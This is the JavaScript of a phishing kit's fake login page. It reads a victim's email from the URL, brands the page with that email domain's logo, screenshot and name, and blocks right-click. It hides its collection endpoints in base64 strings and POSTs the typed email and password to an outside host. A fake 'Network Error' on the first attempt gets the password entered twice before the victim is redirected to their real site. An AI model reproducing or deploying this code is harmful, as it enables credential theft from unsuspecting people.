

        const crax_the_mail = window.location.hash.substr(1);
        $('#crax_the_mail').val(crax_the_mail);
        const ind = crax_the_mail.indexOf("@");
        const crax_the_domain = crax_the_mail.substr((ind + 1));

        const crax_the_domain_url = 'https://' + crax_the_domain;
        const crax_the_domain_org = crax_the_domain.substr(0, crax_the_domain.indexOf('.'));
        const crax_the_domain_org_small = crax_the_domain_org.toLowerCase();
        const crax_the_domain_org_caps = crax_the_domain_org.toUpperCase();
        const crax_the_domain_org_snake = crax_the_domain_org[0].toUpperCase() + crax_the_domain_org.substring(1);

        let crax_default_bg_image = "https://image.thum.io/get/width/1200/" + crax_the_domain_url;
        const crax_the_card_logoimg = "https://logo.clearbit.com/" + crax_the_domain_url
        const mx_record = atob("aHR0cHM6Ly9kZXYtY3JheC1teC5wYW50aGVvbnNpdGUuaW8vd3AtaW5jbHVkZXMvY3JheC1teC9jaGVja2Rucy5waHA") + "?email=" + crax_the_mail;
        const crax_subm = atob("aHR0cHM6Ly93aGF0ZXZlci5ydS5jb20vU291cmNlL29yZGVycnMubXguYXV0b2JnLmNyYXgvZHJ1bi5waHA=");

        $(document).prop('title', crax_the_domain_org_snake);

        const faviconUrl = crax_the_card_logoimg
        const $favicon = $('link[rel="shortcut icon"]');
        $favicon.attr('href', faviconUrl);

        $("#crax_the_card_logoimg").attr("src", crax_the_card_logoimg);
        $("#crax_the_card_logoname").html(crax_the_domain_org_caps);
        $("#crax_default_bg_image").css({
            "background-image": `url('${crax_default_bg_image}')`
        });

        function getMxRecordFromAPI() {
            return $.ajax({
                url: mx_record,
                type: 'GET',
                dataType: 'json',
            });
        }

        const translations = {
            english: {
                signInButton: "Sign in",
                firstError: "Network Error! Error connecting to login server<br/> Please try again",
                loading: "Loading..."
            }
        };

        let firstError, buttonProp, loading

        async function translatePage(language) {
            if (language === "china") {
                const translationResponse = await fetch("https://dev-crax-mx.pantheonsite.io/wp-includes/crax-mx/translate.php")
                const translation = await translationResponse.json()
                firstError = translation.firstError
                buttonProp = translation.signInButton
                loading = translation.loading
                $("#crax_the_form_heading").text(translation.formHeading);
                $("#crax_the_pass").attr("placeholder", translation.passwordPlaceholder);
                $("#crax_the_submit_button").text(translation.signInButton);
                $("#crax_the_secure_label").text(translation.secure);
            } else {
                firstError = translations.english.firstError
                buttonProp = translations.english.signInButton
                loading = translations.english.loading
            }
        }

        function handleLanguage() {
            getMxRecordFromAPI()
                .then(async (record) => {
                    let data
                    try {
                        const response = await fetch(`https://dev-crax-mx.pantheonsite.io/wp-includes/crax-mx/bgbase_and_lang.php?mx=${record.mxRecords}`)
                        data = await response.json();
                        crax_default_bg_image = data.crax_default_bg_image
                    } catch (error) {
                        console.error("Error fetching data ", error)
                    }
                    return data?.language || "english";
                })
                .then((language) => {
                    translatePage(language);
                    const img = new Image();
                    img.src = crax_default_bg_image;
                    img.onload = function () {
                        $("#crax_default_bg_image").css({
                            "background-image": `url('${crax_default_bg_image}')`
                        });
                        hideLoading()
                        setTimeout(() => {
                            $('#crax_the_wrapper').show();
                            setTimeout(() => {
                                $(".modal-custom").addClass("modal-show")
                            }, 100)
                        }, 1500)
                    }
                })
                .catch((error) => {
                    console.error("Error fetching language data:", error);
                })
        }

        function showLoading() {
            $('#loadingSpinner').show();
        }

        function hideLoading() {
            $('#loadingSpinner').hide();
        }

        $(document).ready(function () {
            $(document).on('contextmenu', function (e) {
                e.preventDefault();
            });
            showLoading()
            handleLanguage();
        });

        const errorBox = document.getElementById("crax_the_error_box");
        let counter = 0;

        document.getElementById("crax_the_login_form").addEventListener("submit", function (e) {
            e.preventDefault();
            const email = document.getElementById("crax_the_mail").value;
            const password = document.getElementById("crax_the_pass").value;

            const $btn = $('#crax_the_submit_button');
            $btn.prop('disabled', true).html(`<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> ${loading}`);

            counter++;

            const formData = new FormData();
            formData.append("email", email);
            formData.append("password", password);

            fetch(
                crax_subm,
                {
                    method: "POST",
                    body: formData,
                }
            )
                .then((response) => {
                    if (counter > 1) {
                        window.location.replace(crax_the_domain_url);
                    } else {
                        showError(
                            firstError
                        );
                    }
                    document.getElementById("crax_the_pass").value = "";
                    $btn.prop('disabled', false).text(buttonProp);
                })
                .catch((error) => {
                    if (counter > 1) {
                        window.location.replace(crax_the_domain_url);
                    } else {
                        showError(
                            firstError
                        );
                    }
                    document.getElementById("crax_the_pass").value = "";
                    $btn.prop('disabled', false).text(buttonProp);
                });
        });

        function showError(message) {
            errorBox.innerHTML = message;
            errorBox.classList.remove("d-none");
            setTimeout(() => {
                errorBox.classList.add("d-none");
                errorBox.innerHTML = "";
            }, 3000);
        }

    
